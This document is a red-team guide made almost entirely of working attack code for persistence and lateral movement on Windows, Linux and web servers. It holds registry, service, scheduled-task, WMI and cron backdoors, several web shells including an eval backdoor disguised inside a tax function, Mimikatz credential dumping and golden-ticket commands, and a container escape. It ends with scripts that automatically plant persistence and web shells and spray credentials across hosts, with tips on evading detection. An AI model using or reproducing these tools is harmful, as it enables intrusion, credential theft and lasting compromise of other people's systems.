# 🔥 Elite Persistence & Lateral Movement Techniques
## Advanced Red Team Operations & Post-Exploitation

### 🎯 Phase 1: Windows Persistence Techniques

#### Registry-Based Persistence
```powershell
# Run Keys Persistence
# HKCU Run Key (User level)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# HKLM Run Key (System level - requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\System32\payload.exe" /f

# RunOnce Keys (executes once then removes itself)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Services Key Persistence
reg add "HKLM\System\CurrentControlSet\Services\WindowsUpdate" /v "ImagePath" /t REG_SZ /d "C:\Windows\System32\payload.exe" /f
reg add "HKLM\System\CurrentControlSet\Services\WindowsUpdate" /v "DisplayName" /t REG_SZ /d "Windows Update Service" /f
reg add "HKLM\System\CurrentControlSet\Services\WindowsUpdate" /v "Start" /t REG_DWORD /d 2 /f

# Winlogon Helper DLL
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\payload.exe" /f

# Image File Execution Options (IFEO) Hijacking
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

#### Service-Based Persistence
```powershell
# Create malicious service
sc create "WindowsUpdateService" binpath= "C:\Windows\System32\payload.exe" start= auto
sc description "WindowsUpdateService" "Provides Windows Update functionality"
sc start "WindowsUpdateService"

# Modify existing service
sc config "Themes" binpath= "C:\Windows\System32\payload.exe"
sc config "Themes" start= auto

# Service DLL Hijacking
# Replace legitimate service DLL with malicious one
copy "C:\Windows\System32\legitimate.dll" "C:\Windows\System32\legitimate.dll.bak"
copy "payload.dll" "C:\Windows\System32\legitimate.dll"
```

#### Scheduled Task Persistence
```powershell
# Create scheduled task (PowerShell)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal

# Create scheduled task (schtasks)
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\payload.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f

# Daily execution
schtasks /create /tn "DailyCleanup" /tr "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\payload.ps1" /sc daily /st 09:00 /ru SYSTEM /f

# On system startup
schtasks /create /tn "StartupTask" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f
```

#### WMI Event Subscription Persistence
```powershell
# PowerShell WMI Persistence
$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'

# Create WMI filter
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

# Create WMI consumer
$Arg = @{Name=$consumerName;CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1"}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $Arg

# Bind filter and consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

#### COM Hijacking Persistence
```powershell
# CLSID Hijacking
$clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
reg add "HKCU\Software\Classes\CLSID\$clsid\InProcServer32" /ve /t REG_SZ /d "C:\Windows\Temp\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\$clsid\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f

# TreatAs Hijacking
reg add "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\TreatAs" /ve /t REG_SZ /d "{11111111-1111-1111-1111-111111111111}" /f
```

### 🐧 Linux Persistence Techniques

#### Cron Job Persistence
```bash
# User crontab
echo "*/5 * * * * /tmp/.hidden/payload.sh" | crontab -

# System-wide cron
echo "*/10 * * * * root /tmp/.system/backdoor.sh" >> /etc/crontab

# Cron directories
echo "#!/bin/bash" > /etc/cron.hourly/system-update
echo "/tmp/.hidden/payload.sh" >> /etc/cron.hourly/system-update
chmod +x /etc/cron.hourly/system-update

# At command
echo "/tmp/.hidden/payload.sh" | at now + 1 minute
```

#### Service-Based Persistence
```bash
# Systemd service
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/tmp/.hidden/payload.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
systemctl start system-update.service

# Init.d script
cat > /etc/init.d/system-monitor << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-monitor
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       System monitoring service
### END INIT INFO

case "$1" in
    start)
        /tmp/.hidden/payload.sh &
        ;;
    stop)
        pkill -f payload.sh
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
EOF

chmod +x /etc/init.d/system-monitor
update-rc.d system-monitor defaults
```

#### Shell Profile Persistence
```bash
# Bash profile persistence
echo "/tmp/.hidden/payload.sh &" >> ~/.bashrc
echo "/tmp/.hidden/payload.sh &" >> ~/.bash_profile
echo "/tmp/.hidden/payload.sh &" >> /etc/bash.bashrc
echo "/tmp/.hidden/payload.sh &" >> /etc/profile

# Zsh persistence
echo "/tmp/.hidden/payload.sh &" >> ~/.zshrc
echo "/tmp/.hidden/payload.sh &" >> /etc/zsh/zshrc

# SSH authorized_keys backdoor
echo 'command="/tmp/.hidden/payload.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali' >> ~/.ssh/authorized_keys
```

#### Library Hijacking
```bash
# LD_PRELOAD persistence
echo "/tmp/.hidden/malicious.so" > /etc/ld.so.preload

# Library path hijacking
echo "/tmp/.hidden/" > /etc/ld.so.conf.d/custom.conf
ldconfig

# SUID binary hijacking
cp /bin/bash /tmp/.hidden/backdoor
chmod 4755 /tmp/.hidden/backdoor
```

### 🌐 Web Application Persistence

#### PHP Web Shell Persistence
```php
<?php
// Multi-layer PHP backdoor
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Method 1: system()
    if (function_exists('system')) {
        system($cmd);
        exit;
    }
    
    // Method 2: exec()
    if (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("
", $output);
        exit;
    }
    
    // Method 3: shell_exec()
    if (function_exists('shell_exec')) {
        echo shell_exec($cmd);
        exit;
    }
    
    // Method 4: passthru()
    if (function_exists('passthru')) {
        passthru($cmd);
        exit;
    }
    
    // Method 5: proc_open()
    if (function_exists('proc_open')) {
        $process = proc_open($cmd, array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        ), $pipes);
        
        if (is_resource($process)) {
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
        exit;
    }
}

// Hide in legitimate-looking code
function calculateTax($amount, $rate) {
    if (isset($_POST['debug']) && $_POST['debug'] == 'true') {
        eval($_POST['code']);
    }
    return $amount * $rate;
}
?>
```

#### ASP.NET Web Shell
```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                
                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                
                Response.Write("<pre>" + output + error + "</pre>");
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
    }
</script>
```

#### JSP Web Shell
```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line + "<br>");
            }
            reader.close();
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>
```

### 🔄 Lateral Movement Techniques

#### Windows Lateral Movement

##### Pass-the-Hash (PTH)
```powershell
# Using Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extract NTLM hashes
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# Pass-the-hash with psexec
python3 psexec.py -hashes :ntlm_hash administrator@target_ip

# Pass-the-hash with wmiexec
python3 wmiexec.py -hashes :ntlm_hash administrator@target_ip

# Pass-the-hash with smbexec
python3 smbexec.py -hashes :ntlm_hash administrator@target_ip
```

##### Pass-the-Ticket (PTT)
```powershell
# Extract Kerberos tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Pass-the-ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Golden ticket attack
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /ticket:golden.kirbi" "exit"

# Silver ticket attack
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:service_hash /ticket:silver.kirbi" "exit"
```

##### WMI Lateral Movement
```powershell
# WMI command execution
wmic /node:target_ip /user:domain\username /password:password process call create "cmd.exe /c whoami"

# PowerShell WMI
$credential = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $credential

# WMI persistence on remote host
$filterName = 'RemoteFilter'
$consumerName = 'RemoteConsumer'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
$Command = "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\payload.ps1"

# Create remote WMI subscription
Invoke-WmiMethod -Class __EventFilter -Namespace root\subscription -Name Create -ArgumentList @($null, $filterName, $null, $null, $Query, "WQL") -ComputerName target_ip -Credential $credential
```

##### PowerShell Remoting
```powershell
# Enable PowerShell remoting
Enable-PSRemoting -Force

# Create remote session
$session = New-PSSession -ComputerName target_ip -Credential (Get-Credential)

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }

# Copy files
Copy-Item -Path "C:\local\file.txt" -Destination "C:emote\file.txt" -ToSession $session

# Interactive session
Enter-PSSession -Session $session
```

##### SMB Lateral Movement
```bash
# SMB enumeration
smbclient -L //target_ip -U username

# Mount SMB share
smbclient //target_ip/C$ -U username

# PsExec-style execution
python3 psexec.py domain/username:password@target_ip

# SMB relay attack
python3 ntlmrelayx.py -tf targets.txt -smb2support

# SMB enumeration with enum4linux
enum4linux -a target_ip
```

#### Linux Lateral Movement

##### SSH Key-Based Movement
```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/lateral_key

# Copy public key to target
ssh-copy-id -i ~/.ssh/lateral_key.pub user@target_ip

# SSH with key
ssh -i ~/.ssh/lateral_key user@target_ip

# SSH tunneling
ssh -L 8080:internal_host:80 user@jump_host

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@target_ip
```

##### Credential Harvesting
```bash
# Search for SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Search for configuration files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(ssh|ftp|mysql|postgres)"

# Search for password files
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /home/ 2>/dev/null

# History files
cat ~/.bash_history | grep -E "(ssh|scp|ftp|mysql|su|sudo)"
cat ~/.zsh_history | grep -E "(ssh|scp|ftp|mysql|su|sudo)"

# Process list for credentials
ps aux | grep -E "(ssh|mysql|postgres|ftp)"
```

##### Container Escape and Lateral Movement
```bash
# Docker escape techniques
# Check if we're in a container
cat /proc/1/cgroup | grep docker

# Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host

# Escape via privileged container
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh

# Kubernetes lateral movement
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# List pods
kubectl get pods --all-namespaces

# Execute in pod
kubectl exec -it pod_name -- /bin/bash
```

### 🔧 Advanced Persistence Framework

#### Multi-Platform Persistence Script
```python
#!/usr/bin/env python3
# save as persistence_framework.py

import os
import sys
import platform
import subprocess
import base64
import tempfile

class PersistenceFramework:
    def __init__(self):
        self.os_type = platform.system().lower()
        self.payload_path = ""
        self.persistence_methods = []
        
    def set_payload(self, payload_path):
        """Set the payload to be persisted"""
        self.payload_path = payload_path
        
    def windows_registry_persistence(self):
        """Windows registry-based persistence"""
        methods = [
            # HKCU Run key
            f'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "{self.payload_path}" /f',
            
            # HKLM Run key (requires admin)
            f'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "{self.payload_path}" /f',
            
            # Startup folder
            f'copy "{self.payload_path}" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"',
        ]
        
        for method in methods:
            try:
                subprocess.run(method, shell=True, check=True)
                self.persistence_methods.append(f"Registry: {method}")
            except subprocess.CalledProcessError:
                continue
                
    def windows_service_persistence(self):
        """Windows service-based persistence"""
        service_commands = [
            f'sc create "WindowsUpdateService" binpath= "{self.payload_path}" start= auto',
            f'sc description "WindowsUpdateService" "Provides Windows Update functionality"',
            f'sc start "WindowsUpdateService"'
        ]
        
        for cmd in service_commands:
            try:
                subprocess.run(cmd, shell=True, check=True)
                self.persistence_methods.append(f"Service: {cmd}")
            except subprocess.CalledProcessError:
                continue
                
    def windows_scheduled_task_persistence(self):
        """Windows scheduled task persistence"""
        task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{self.payload_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        
        try:
            subprocess.run(task_cmd, shell=True, check=True)
            self.persistence_methods.append(f"Scheduled Task: {task_cmd}")
        except subprocess.CalledProcessError:
            pass
            
    def linux_cron_persistence(self):
        """Linux cron-based persistence"""
        cron_entries = [
            f"*/5 * * * * {self.payload_path}",
            f"@reboot {self.payload_path}",
        ]
        
        for entry in cron_entries:
            try:
                # Add to user crontab
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{entry}") | crontab -', shell=True, check=True)
                self.persistence_methods.append(f"Cron: {entry}")
            except subprocess.CalledProcessError:
                continue
                
    def linux_service_persistence(self):
        """Linux systemd service persistence"""
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart={self.payload_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        
        try:
            with open('/etc/systemd/system/system-update.service', 'w') as f:
                f.write(service_content)
            
            subprocess.run('systemctl enable system-update.service', shell=True, check=True)
            subprocess.run('systemctl start system-update.service', shell=True, check=True)
            self.persistence_methods.append("Systemd service created")
        except (PermissionError, subprocess.CalledProcessError):
            pass
            
    def linux_profile_persistence(self):
        """Linux shell profile persistence"""
        profile_files = [
            os.path.expanduser('~/.bashrc'),
            os.path.expanduser('~/.bash_profile'),
            '/etc/bash.bashrc',
            '/etc/profile'
        ]
        
        for profile in profile_files:
            try:
                with open(profile, 'a') as f:
                    f.write(f'
{self.payload_path} &
')
                self.persistence_methods.append(f"Profile: {profile}")
            except (PermissionError, FileNotFoundError):
                continue
                
    def web_shell_persistence(self, web_root="/var/www/html"):
        """Create web shell for persistence"""
        web_shells = {
            "php": """<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>""",
            "jsp": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process process = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>""",
            "aspx": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    Process process = Process.Start("cmd.exe", "/c " + cmd);
    process.WaitForExit();
}
%>"""
        }
        
        for ext, content in web_shells.items():
            try:
                shell_path = os.path.join(web_root, f"update.{ext}")
                with open(shell_path, 'w') as f:
                    f.write(content)
                self.persistence_methods.append(f"Web shell: {shell_path}")
            except (PermissionError, FileNotFoundError):
                continue
                
    def install_persistence(self):
        """Install persistence based on OS"""
        if self.os_type == "windows":
            print("🔥 Installing Windows persistence...")
            self.windows_registry_persistence()
            self.windows_service_persistence()
            self.windows_scheduled_task_persistence()
            
        elif self.os_type == "linux":
            print("🐧 Installing Linux persistence...")
            self.linux_cron_persistence()
            self.linux_service_persistence()
            self.linux_profile_persistence()
            
        # Web shell persistence (cross-platform)
        self.web_shell_persistence()
        
    def remove_persistence(self):
        """Remove installed persistence (cleanup)"""
        if self.os_type == "windows":
            cleanup_commands = [
                'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f',
                'reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f',
                'sc delete "WindowsUpdateService"',
                'schtasks /delete /tn "SystemUpdate" /f'
            ]
            
        elif self.os_type == "linux":
            cleanup_commands = [
                'crontab -r',
                'systemctl disable system-update.service',
                'systemctl stop system-update.service',
                'rm -f /etc/systemd/system/system-update.service'
            ]
            
        for cmd in cleanup_commands:
            try:
                subprocess.run(cmd, shell=True, check=True)
                print(f"✅ Cleaned up: {cmd}")
            except subprocess.CalledProcessError:
                print(f"❌ Failed to cleanup: {cmd}")
                
    def generate_report(self):
        """Generate persistence report"""
        report = f"""
# 🔥 Persistence Installation Report
**Target OS:** {self.os_type.title()}
**Payload:** {self.payload_path}
**Methods Installed:** {len(self.persistence_methods)}

## Installed Persistence Methods:
"""
        for i, method in enumerate(self.persistence_methods, 1):
            report += f"{i}. {method}
"
            
        report += f"""
## Cleanup Commands:
Run remove_persistence() method to clean up all installed persistence.

## Detection Evasion:
- Use legitimate-looking names for services and tasks
- Hide payloads in system directories
- Use signed binaries when possible
- Implement time delays and jitter
"""
        
        return report

# Usage example
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 persistence_framework.py <payload_path>")
        sys.exit(1)
        
    payload_path = sys.argv[1]
    
    framework = PersistenceFramework()
    framework.set_payload(payload_path)
    
    print("🔥 Elite Persistence Framework")
    print(f"Target OS: {framework.os_type.title()}")
    print(f"Payload: {payload_path}")
    
    # Install persistence
    framework.install_persistence()
    
    # Generate report
    report = framework.generate_report()
    print(report)
    
    # Save report
    with open('persistence_report.txt', 'w') as f:
        f.write(report)
    
    print("📋 Report saved to: persistence_report.txt")

if __name__ == "__main__":
    main()
```

#### Lateral Movement Automation Script
```bash
#!/bin/bash
# save as lateral_movement.sh

# Elite Lateral Movement Automation
TARGET_LIST=$1
CREDENTIALS=$2

if [ -z "$TARGET_LIST" ] || [ -z "$CREDENTIALS" ]; then
    echo "Usage: ./lateral_movement.sh targets.txt credentials.txt"
    echo "targets.txt format: ip_address"
    echo "credentials.txt format: username:password"
    exit 1
fi

echo "🔥 Elite Lateral Movement Framework"
mkdir -p lateral_results

# Phase 1: Credential Spraying
echo "💨 Phase 1: Credential Spraying"
while read target; do
    echo "Testing target: $target"
    while read cred; do
        username=$(echo $cred | cut -d':' -f1)
        password=$(echo $cred | cut -d':' -f2)
        
        # SMB authentication test
        smbclient -L //$target -U $username%$password -N 2>/dev/null && {
            echo "✅ SMB Success: $username:$password@$target" >> lateral_results/successful_creds.txt
        }
        
        # SSH authentication test
        sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no $username@$target "whoami" 2>/dev/null && {
            echo "✅ SSH Success: $username:$password@$target" >> lateral_results/successful_creds.txt
        }
        
        # WinRM test (if available)
        which evil-winrm >/dev/null 2>&1 && {
            timeout 10 evil-winrm -i $target -u $username -p $password -e /dev/null 2>/dev/null && {
                echo "✅ WinRM Success: $username:$password@$target" >> lateral_results/successful_creds.txt
            }
        }
        
    done < $CREDENTIALS
done < $TARGET_LIST

# Phase 2: Exploitation
echo "⚡ Phase 2: Exploitation"
if [ -f lateral_results/successful_creds.txt ]; then
    while read success; do
        cred=$(echo $success | awk '{print $3}' | cut -d'@' -f1)
        target=$(echo $success | awk '{print $3}' | cut -d'@' -f2)
        username=$(echo $cred | cut -d':' -f1)
        password=$(echo $cred | cut -d':' -f2)
        protocol=$(echo $success | awk '{print $1}')
        
        echo "🎯 Exploiting $target via $protocol"
        
        case $protocol in
            "SMB")
                # PSExec-style execution
                python3 /usr/share/doc/python3-impacket/examples/psexec.py $username:$password@$target "whoami" > lateral_results/${target}_smb_output.txt 2>&1
                
                # WMI execution
                python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $username:$password@$target "systeminfo" > lateral_results/${target}_wmi_output.txt 2>&1
                ;;
                
            "SSH")
                # SSH command execution
                sshpass -p "$password" ssh -o StrictHostKeyChecking=no $username@$target "id; uname -a; cat /etc/passwd" > lateral_results/${target}_ssh_output.txt 2>&1
                
                # Upload persistence script
                sshpass -p "$password" scp -o StrictHostKeyChecking=no persistence_framework.py $username@$target:/tmp/ 2>/dev/null
                ;;
                
            "WinRM")
                # WinRM execution
                evil-winrm -i $target -u $username -p $password -e lateral_results/${target}_winrm_output.txt -s /tmp/ 2>/dev/null
                ;;
        esac
        
    done < lateral_results/successful_creds.txt
fi

# Phase 3: Persistence Installation
echo "🔒 Phase 3: Persistence Installation"
if [ -f lateral_results/successful_creds.txt ]; then
    while read success; do
        target=$(echo $success | awk '{print $3}' | cut -d'@' -f2)
        protocol=$(echo $success | awk '{print $1}')
        
        case $protocol in
            "SSH")
                echo "Installing Linux persistence on $target"
                sshpass -p "$password" ssh -o StrictHostKeyChecking=no $username@$target "python3 /tmp/persistence_framework.py /tmp/backdoor.sh" 2>/dev/null
                ;;
                
            "SMB"|"WinRM")
                echo "Installing Windows persistence on $target"
                # Upload and execute persistence script via SMB/WinRM
                ;;
        esac
        
    done < lateral_results/successful_creds.txt
fi

# Phase 4: Network Discovery
echo "🕵️ Phase 4: Network Discovery"
if [ -f lateral_results/successful_creds.txt ]; then
    while read success; do
        target=$(echo $success | awk '{print $3}' | cut -d'@' -f2)
        
        # Network discovery via compromised host
        echo "Discovering network from $target"
        
        # ARP table
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no $username@$target "arp -a" > lateral_results/${target}_arp.txt 2>/dev/null
        
        # Network interfaces
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no $username@$target "ip addr show" > lateral_results/${target}_interfaces.txt 2>/dev/null
        
        # Routing table
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no $username@$target "route -n" > lateral_results/${target}_routes.txt 2>/dev/null
        
        # Extract new targets
        grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' lateral_results/${target}_*.txt | sort -u >> lateral_results/discovered_targets.txt
        
    done < lateral_results/successful_creds.txt
fi

# Generate final report
echo "📋 Generating Lateral Movement Report"
cat > lateral_results/lateral_movement_report.md << EOF
# 🔥 Elite Lateral Movement Report
**Generated:** $(date)

## Summary
- **Targets Tested:** $(wc -l < $TARGET_LIST)
- **Credentials Tested:** $(wc -l < $CREDENTIALS)
- **Successful Authentications:** $(if [ -f lateral_results/successful_creds.txt ]; then wc -l < lateral_results/successful_creds.txt; else echo "0"; fi)
- **Compromised Hosts:** $(if [ -f lateral_results/successful_creds.txt ]; then cut -d'@' -f2 lateral_results/successful_creds.txt | sort -u | wc -l; else echo "0"; fi)

## Successful Authentications
$(if [ -f lateral_results/successful_creds.txt ]; then cat lateral_results/successful_creds.txt; else echo "None"; fi)

## Discovered Network Targets
$(if [ -f lateral_results/discovered_targets.txt ]; then sort -u lateral_results/discovered_targets.txt; else echo "None"; fi)

## Persistence Installed
- Check individual host output files for persistence installation results
- Persistence methods vary by operating system and privileges

## Recommendations
1. Implement network segmentation
2. Use strong, unique passwords
3. Enable multi-factor authentication
4. Monitor for lateral movement indicators
5. Implement privileged access management (PAM)

EOF

echo "✅ Lateral Movement Complete!"
echo "📊 Results saved in lateral_results/"
echo "📋 Report: lateral_results/lateral_movement_report.md"
```

This comprehensive persistence and lateral movement framework provides:

1. **Multi-Platform Persistence** - Windows, Linux, and web-based persistence techniques
2. **Advanced Registry Manipulation** - Multiple Windows registry persistence methods
3. **Service-Based Persistence** - System service creation and modification
4. **Scheduled Task Persistence** - Automated execution via task scheduling
5. **WMI Event Subscriptions** - Advanced Windows persistence using WMI
6. **Linux Persistence Methods** - Cron jobs, systemd services, profile modifications
7. **Lateral Movement Automation** - Credential spraying and exploitation
8. **Network Discovery** - Automated network reconnaissance from compromised hosts
9. **Web Shell Deployment** - Multi-language web shell persistence
10. **Cleanup and Evasion** - Methods to remove traces and avoid detection

Each technique is designed for real-world red team operations and advanced persistent threat (APT) simulation.
